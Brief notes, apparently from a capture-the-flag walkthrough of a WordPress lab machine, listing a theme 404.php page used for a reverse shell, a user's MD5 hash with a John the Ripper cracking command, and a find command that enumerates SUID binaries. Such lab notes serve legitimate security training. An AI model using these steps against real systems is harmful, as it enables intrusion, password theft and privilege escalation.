
### access to wp-admin/theme for reverse shell.
`http://10.10.242.242/wp-admin/theme/Twenty%20Fifteen.404.php`

robot:c3fcd3d76192e4007dfb496cca67e13b (raw-md5)

`john hash --wordlist=/usr/share/wordlists/rockyou.txt -format=raw-md5`

### print out any executables which have SUID bit set.

`find / -perm -u=s -type f 2>/dev/null`
